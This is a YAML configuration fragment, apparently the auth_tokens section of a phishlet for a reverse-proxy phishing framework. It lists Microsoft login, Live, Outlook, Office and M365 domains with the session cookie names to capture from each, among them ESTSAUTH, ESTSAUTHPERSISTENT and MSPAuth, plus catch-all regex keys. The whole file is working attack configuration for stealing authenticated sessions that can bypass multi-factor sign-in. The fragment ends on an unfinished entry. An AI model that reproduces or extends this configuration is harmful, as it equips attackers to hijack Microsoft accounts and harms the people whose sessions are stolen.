auth_tokens:
  # Core Microsoft domains
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', 'buid', 'x-ms-gateway-slice', 'stsservicecookie', 'AADSSO', 'KMSI', 'contextid', '.*,regexp']
  - domain: 'login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', 'buid', 'x-ms-gateway-slice', 'stsservicecookie', 'AADSSO', 'KMSI', 'contextid', '.*,regexp']
  - domain: '.login.microsoft.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', 'buid', 'x-ms-gateway-slice', 'stsservicecookie', 'AADSSO', 'KMSI', 'contextid', '.*,regexp']
  - domain: 'login.microsoft.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', 'buid', 'x-ms-gateway-slice', 'stsservicecookie', 'AADSSO', 'KMSI', 'contextid', '.*,regexp']
  - domain: '.microsoft.com'
    keys: ['.*,regexp']
  - domain: '.live.com'
    keys: ['MSPAuth', 'MSPProf', 'MSPSoft', 'MSPOK', 'MC0', 'MC1', 'MS0', 'NAP', 'PPAuth', 'MH', 'ANON', 'MSA', 'OParams', 'contextid', '.*,regexp']
  - domain: '.login.live.com'
    keys: ['MSPAuth', 'MSPProf', 'MSPSoft', 'MSPOK', 'MC0', 'MC1', 'MS0', 'NAP', 'PPAuth', 'MH', 'ANON', 'MSA', 'OParams', 'contextid', '.*,regexp']
  - domain: 'login.live.com'
    keys: ['MSPAuth', 'MSPProf', 'MSPSoft', 'MSPOK', 'MC0', 'MC1', 'MS0', 'NAP', 'PPAuth', 'MH', 'ANON', 'MSA', 'OParams', 'contextid', '.*,regexp']
  - domain: 'outlook.live.com'
    keys: ['.*,regexp']
  - domain: '.office.com'
    keys: ['.*,regexp']
  - domain: 'www.office.com'
    keys: ['.*,regexp']
  - domain: 'm365.cloud.microsoft'
    keys: ['.*,regexp']
  - domain: '.m365.cloud.microsoft'
